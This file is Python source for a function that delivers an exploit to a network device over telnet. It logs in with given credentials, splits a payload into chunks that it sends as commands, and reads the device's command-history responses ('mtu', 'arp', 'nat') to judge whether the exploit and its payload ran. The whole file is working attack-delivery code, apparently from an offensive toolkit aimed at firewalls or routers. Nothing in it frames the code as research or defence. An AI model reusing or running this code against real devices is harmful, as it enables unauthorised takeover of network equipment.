import string
import time
import binascii
import telnetlib

from params import *


def exploit_over_telnet(params, payload):
    if params.verbose:
        print "initiating telnet"

    try:
        tn = telnetlib.Telnet(params.target_ip, params.target_port)
    except:
        print "failed to connect, telnet not open on target?"
        return 1

    responses = [">",          ##

                 "sername:",   ##

                 "assword:"]   ##

    sent_user = False
    sent_pass = False
    while True:
        (idx, match, text) = tn.expect(responses, params.timeout)
        print "***\n" + text + "\n***"

        if idx == 0:
            ##
            break
        elif idx == 1:
            if sent_user:
                print "received username prompt twice, abort, bad creds"
                return 1
            print "received username prompt, sending"
            tn.write(params.username + "\n")
            sent_user = True
        elif idx == 2:
            if sent_pass:
                print "received password prompt twice, abort, bad creds"
                return 1
            print "received password prompt, sending"
            tn.write(params.password + "\n")
            sent_pass = True

    if idx == 0:
        print "received prompt, we're in"
    else:
        print "failed to login, bad creds, abort"
        print "telnet fails"
        return 1

    if params.verbose:
        print "sending payload"

    ##
    ##
    ##
    ##
    chopped = string.rstrip(payload, "\x0a")
    chunks = string.split(chopped, "\x0a")
    ##
    if len(chunks) == 16:
        chunks = [string.join((chunks[0], chunks[1]), "\x0a")] + chunks[2:]
    tot = len(chunks)
    n = 1
    for chunk in chunks:
        if params.verbose:
            print "sending command " + str(n) + "/" + str(tot) + ", len " + str(len(chunk) + 1)
        n = n + 1
        tn.write(chunk + "\x0a")

        responses = [">"]  ##

        (idx, match, text) = tn.expect(responses, params.timeout)
        if text.find("Invalid input"):
            print "received expected error msg, still alive"
        else:
            print "no prompt returned, exploit may be failing"

        time.sleep(params.delay)

    if params.verbose:
        print "payload sent"
        print "waiting for response from target"

    time.sleep(params.delay)

    PREV = "\x10"

    tn.write(PREV + PREV + PREV)
    responses = ["mtu", "arp", "nat"]
    response = tn.expect(responses, timeout=params.timeout)
    status = 0
    if response[0] == 0:
        print "received mtu - EPBA: ok, payload: ok"
        status = 0
    elif response[0] == 1:
        print "received arp - EPBA: ok, payload: fail"
        status = 1
    elif response[0] == 2:
        print "received nat - EPBA: ok, payload: mangled, did not run"
        status = 1
    else:
        print "no status returned from target, could be an exploit failure, or this is a version where we don't expect a status return"
        status = 0

    tn.close()

    return status
